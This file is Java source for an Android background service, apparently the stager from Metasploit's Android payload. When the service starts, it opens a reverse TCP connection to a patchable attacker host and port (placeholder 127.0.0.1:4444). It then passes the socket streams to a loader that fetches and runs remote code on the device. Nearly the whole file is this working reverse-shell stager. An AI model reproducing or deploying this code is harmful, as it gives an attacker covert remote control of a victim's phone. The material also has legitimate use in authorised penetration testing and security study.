package com.metasploit.stage;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.IBinder;
import android.widget.Toast;

public class StageService extends Service {

	 // avoid re-ordering the strings in classes.dex - append XXXX
    public static final String LHOST = "XXXX127.0.0.1                       ";
    public static final String LPORT = "YYYY4444                            "; 
	
	int mStartMode;
	private boolean isRunning = true;
	private Socket msgsock;
	
	@Override
	public IBinder onBind(Intent arg0) {

		return null;
	}
	 
	@Override
	public void onCreate() {
		
		Toast.makeText(this, "Service Started", Toast.LENGTH_SHORT).show();

	
		startAsync(); 
    }
	

    private void startAsync() {
        new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                reverseTCP();
                return null;
            }
        }.execute();
    }

    private void reverseTCP() {
        try {
            String lhost = LHOST.substring(4).trim();
            String lport = LPORT.substring(4).trim();
            msgsock = new Socket(lhost, Integer.parseInt(lport));
            DataInputStream in = new DataInputStream(msgsock.getInputStream());
            OutputStream out = new DataOutputStream(msgsock.getOutputStream());
            new LoadStage().start(in, out, getApplicationContext(), new String[] {});
            msgsock.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public void onDestroy() {
    	isRunning = false;
    	try {
			msgsock.close();
		} catch (IOException e) {

			e.printStackTrace();
		}
    	Toast.makeText(this, "Service Stopped", Toast.LENGTH_SHORT).show();
    	super.onDestroy();
    }

}
